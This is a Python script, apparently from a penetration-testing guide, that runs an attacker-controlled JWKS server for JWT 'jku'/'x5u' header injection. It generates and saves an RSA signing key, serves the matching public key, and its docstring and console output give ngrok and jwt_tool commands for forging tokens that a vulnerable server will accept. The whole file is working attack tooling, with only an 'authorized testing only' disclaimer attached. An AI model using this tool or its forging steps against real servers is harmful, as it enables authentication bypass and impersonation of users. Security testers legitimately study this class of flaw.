#!/usr/bin/env python3
"""
jwks_server.py — attacker-controlled JWKS host for `jku`/`x5u` injection (guide §11).

Generates an RSA keypair, writes the private key to disk, and serves a JWKS at /jwks.json
containing YOUR public key. Point a token's `jku` header at this server's URL and sign the
token with the saved private key; a vulnerable server fetches your JWKS and "verifies"
successfully -> it accepts a token you forged.

Expose it publicly (the target must reach it):
    ngrok http 8000        OR    cloudflared tunnel --url http://localhost:8000
Then forge, e.g. with jwt_tool:
    python3 jwt_tool.py <TOKEN> -X s -ju https://YOUR-HOST/jwks.json -pr jwt_private.pem

AUTHORIZED TESTING ONLY. Forge into your own test account; never impersonate a real user.
Even if the key isn't honored, a fetch to this host proves SSRF (use a Collaborator host to log it).

Requires: pip install cryptography
"""
import argparse
import base64
import json
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

try:
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
except ImportError:
    print("[!] pip install cryptography", file=sys.stderr)
    sys.exit(1)

KID = "poc-key"
JWKS = {"keys": []}


def b64u_uint(n: int) -> str:
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def setup_keys(out="jwt_private.pem"):
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    with open(out, "wb") as f:
        f.write(priv.private_bytes(serialization.Encoding.PEM,
                                   serialization.PrivateFormat.PKCS8,
                                   serialization.NoEncryption()))
    nums = priv.public_key().public_numbers()
    JWKS["keys"] = [{
        "kty": "RSA", "kid": KID, "use": "sig", "alg": "RS256",
        "n": b64u_uint(nums.n), "e": b64u_uint(nums.e),
    }]
    return out


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(JWKS).encode()
        print(f"[FETCH] {self.client_address[0]} GET {self.path}  UA={self.headers.get('User-Agent','')}")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def main():
    ap = argparse.ArgumentParser(description="Serve an attacker JWKS for jku/x5u injection.")
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--out", default="jwt_private.pem", help="where to save the private key")
    args = ap.parse_args()

    keyfile = setup_keys(args.out)
    print("=== Attacker JWKS server (AUTHORIZED TESTING ONLY) ===")
    print(f"[i] Private key saved to: {keyfile}  (sign your forged token with this)")
    print(f"[i] kid = {KID!r}  (set the token header.kid to match)")
    print(f"[i] Serving JWKS on 0.0.0.0:{args.port}/jwks.json")
    print("[i] Expose publicly, then set the token header.jku to https://YOUR-HOST/jwks.json")
    print("\n[i] Forge with jwt_tool:")
    print(f"    python3 jwt_tool.py <TOKEN> -X s -ju https://YOUR-HOST/jwks.json -pr {keyfile}\n")
    try:
        ThreadingHTTPServer(("0.0.0.0", args.port), Handler).serve_forever()
    except KeyboardInterrupt:
        print("\n[i] stopped")


if __name__ == "__main__":
    main()
